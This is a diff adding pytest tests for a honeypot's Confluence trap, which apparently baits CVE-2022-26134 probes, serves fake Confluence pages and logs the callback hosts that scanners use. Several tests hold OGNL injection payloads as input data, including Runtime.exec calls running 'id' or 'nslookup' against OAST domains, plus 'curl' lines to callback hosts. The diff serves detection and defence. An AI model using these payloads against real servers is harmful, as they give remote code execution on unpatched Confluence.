@@ -357,6 +357,7 @@ def test_all_trap_families_default_on():
     assert tbenv.HIKVISION_ENABLED
     assert tbenv.GEOSERVER_ENABLED
     assert tbenv.COLDFUSION_ENABLED
+    assert tbenv.CONFLUENCE_ENABLED
     assert tbenv.CMD_INJECTION_ENABLED
 
 
@@ -2817,6 +2818,219 @@ async def test_dispatch_rejects_unsupported_methods(flux_client):
     downstream and stops tarpit/canary logic from running on odd verbs."""
     resp = await flux_client.put("/anything", data=b"x")
     assert resp.status == 405
+
+
+# --- Confluence trap (CVE-2022-26134 OGNL RCE bait) ---
+
+
+def test_confluence_enabled_by_default():
+    assert tbenv.CONFLUENCE_ENABLED
+
+
+def test_confluence_default_paths_cover_observed_probes():
+    for path in (
+        "/pages/createpage-entervariables.action",
+        "/confluence/pages/createpage-entervariables.action",
+        "/wiki/pages/createpage-entervariables.action",
+        "/pages/doenterpagevariables.action",
+        "/templates/editor-preload-container",
+        "/users/user-dark-features",
+        "/login.action",
+    ):
+        assert tbenv.is_confluence_path(path), f"expected match: {path}"
+
+
+def test_confluence_path_matches_url_encoded_ognl_in_path():
+    # Canonical CVE-2022-26134 path shape — URL-encoded OGNL expression
+    # as the first path segment.
+    encoded = "/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22nslookup%20abc.oast.me%22%29%7D/"
+    assert tbenv.is_confluence_path(encoded)
+    # Raw (decoded) shape, in case nginx normalises it for us.
+    assert tbenv.is_confluence_path("/${@java.lang.Runtime@getRuntime().exec(\"id\")}/")
+
+
+def test_confluence_path_non_match():
+    for path in (
+        "/",
+        "/index.html",
+        "/.env",
+        "/pages/",  # too generic
+        "/wiki/",   # too generic, no action
+        "/pages/foo.html",
+    ):
+        assert not tbenv.is_confluence_path(path), f"unexpected match: {path}"
+
+
+def test_confluence_disabled_returns_false(monkeypatch):
+    monkeypatch.setattr(tbenv, "CONFLUENCE_ENABLED", False)
+    assert not tbenv.is_confluence_path("/pages/createpage-entervariables.action")
+    assert not tbenv.is_confluence_path("/${@java.lang.Runtime@getRuntime().exec(\"id\")}/")
+
+
+def test_confluence_has_ognl_indicators():
+    assert tbenv._confluence_has_ognl(
+        "/${@java.lang.Runtime@getRuntime().exec(\"x\")}/", "", "",
+    )
+    assert tbenv._confluence_has_ognl(
+        "/%24%7b%40java.lang.runtime%40getruntime%28%29.exec/", "", "",
+    )
+    assert tbenv._confluence_has_ognl(
+        "/pages/createpage-entervariables.action",
+        "",
+        '${@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("id"))}',
+    )
+    assert not tbenv._confluence_has_ognl("/login.action", "", "")
+    assert not tbenv._confluence_has_ognl("/pages/", "os_username=admin", "")
+
+
+def test_confluence_extract_oast_callback_url_encoded():
+    payload = (
+        "/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22"
+        "nslookup%20d7o9gl5q3g2u7gjrcdmgdpjnby6nsjaud.oast.me%22%29%7D/"
+    )
+    assert (
+        tbenv._extract_oast_callback(payload)
+        == "d7o9gl5q3g2u7gjrcdmgdpjnby6nsjaud.oast.me"
+    )
+
+
+def test_confluence_extract_oast_callback_multi_family():
+    for hostname in (
+        "abcd.oast.me",
+        "abcd.interact.sh",
+        "abcd.dnslog.cn",
+        "deadbeef.burpcollaborator.net",
+    ):
+        text = f'curl http://{hostname}/x'
+        assert tbenv._extract_oast_callback(text) == hostname
+
+
+def test_confluence_extract_oast_callback_no_match():
+    assert tbenv._extract_oast_callback("") == ""
+    assert tbenv._extract_oast_callback("not a callback") == ""
+    # Domain has to be the actual TLD — `notoast.me` is its own TLD-eq,
+    # `oast.me` must follow a leading label.
+    assert tbenv._extract_oast_callback("oast.me") == ""
+
+
+def test_render_confluence_login_html_shape():
+    body = tbenv.render_confluence_login_html("conf.example", "7.18.1").decode("utf-8")
+    assert "Confluence" in body
+    assert "7.18.1" in body
+    assert "conf.example" in body
+    assert "/dologin.action" in body
+    assert "atl_token" in body
+
+
+def test_render_confluence_dark_features_json_shape():
+    payload = json.loads(tbenv.render_confluence_dark_features_json())
+    assert "siteFeatures" in payload
+    assert "userFeatures" in payload
+
+
+def test_render_confluence_editor_preload_html_shape():
+    body = tbenv.render_confluence_editor_preload_html("7.18.1").decode("utf-8")
+    assert "editor-preload-container" in body
+    assert "7.18.1" in body
+
+
+async def test_dispatch_confluence_login_action(flux_client):
+    resp = await flux_client.get(
+        "/login.action",
+        headers={"X-Forwarded-For": "203.0.113.71", "Host": "conf.example"},
+    )
+    assert resp.status == 200
+    text = await resp.text()
+    assert "Confluence" in text
+    assert tbenv.CONFLUENCE_VERSION in text
+    assert resp.headers.get("X-Confluence-Request-Time")
+
+    entry = _log_entries(flux_client.log_path)[-1]
+    assert entry["result"] == "confluence-login"
+    assert entry["confluencePath"] == "/login.action"
+    assert entry["confluenceMethod"] == "GET"
+    assert entry["confluenceHasOgnl"] is False
+
+
+async def test_dispatch_confluence_ognl_path_extracts_oast_callback(flux_client):
+    encoded = (
+        "/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22"
+        "nslookup%20probe123.oast.me%22%29%7D/"
+    )
+    resp = await flux_client.get(
+        encoded,
+        headers={"X-Forwarded-For": "203.0.113.72"},
+    )
+    assert resp.status == 200
+    text = await resp.text()
+    # Returning the login HTML keeps the scanner believing the OGNL
+    # expression evaluated successfully.
+    assert "Confluence" in text
+
+    entry = _log_entries(flux_client.log_path)[-1]
+    assert entry["result"] == "confluence-ognl-probe"
+    assert entry["confluenceHasOgnl"] is True
+    assert entry["confluenceOastCallback"] == "probe123.oast.me"
+    assert "confluencePayloadPreview" in entry
+
+
+async def test_dispatch_confluence_createpage_post_extracts_body_callback(flux_client):
+    body_bytes = (
+        b'queryString=${@org.apache.commons.io.IOUtils@toString('
+        b'@java.lang.Runtime@getRuntime().exec("nslookup tag42.interact.sh"))}'
+    )
+    resp = await flux_client.post(
+        "/pages/createpage-entervariables.action",
+        data=body_bytes,
+        headers={
+            "X-Forwarded-For": "203.0.113.73",
+            "Content-Type": "application/x-www-form-urlencoded",
+        },
+    )
+    assert resp.status == 200
+
+    entry = _log_entries(flux_client.log_path)[-1]
+    assert entry["result"] == "confluence-ognl-probe"
+    assert entry["confluenceMethod"] == "POST"
+    assert entry["confluenceHasOgnl"] is True
+    assert entry["confluenceOastCallback"] == "tag42.interact.sh"
+
+
+async def test_dispatch_confluence_user_dark_features_returns_json(flux_client):
+    resp = await flux_client.get(
+        "/users/user-dark-features",
+        headers={"X-Forwarded-For": "203.0.113.74"},
+    )
+    assert resp.status == 200
+    payload = await resp.json()
+    assert payload == {"siteFeatures": [], "userFeatures": []}
+
+    entry = _log_entries(flux_client.log_path)[-1]
+    assert entry["result"] == "confluence-dark-features"
+
+
+async def test_dispatch_confluence_editor_preload_returns_html(flux_client):
+    resp = await flux_client.get(
+        "/templates/editor-preload-container",
+        headers={"X-Forwarded-For": "203.0.113.75"},
+    )
+    assert resp.status == 200
+    text = await resp.text()
+    assert "editor-preload-container" in text
+
+    entry = _log_entries(flux_client.log_path)[-1]
+    assert entry["result"] == "confluence-editor-preload"
+
+
+async def test_dispatch_confluence_disabled_returns_404(flux_client, monkeypatch):
+    monkeypatch.setattr(tbenv, "CONFLUENCE_ENABLED", False)
+    resp = await flux_client.get(
+        "/pages/createpage-entervariables.action",
+        headers={"X-Forwarded-For": "203.0.113.76"},
+    )
+    assert resp.status == 404
+    entries = _log_entries(flux_client.log_path)
+    assert entries[-1]["result"] == "not-handled"
 
 
 # --- Cmd-injection trap (/admin/config?cmd=, /printenv, /cgi-bin/printenv) ---
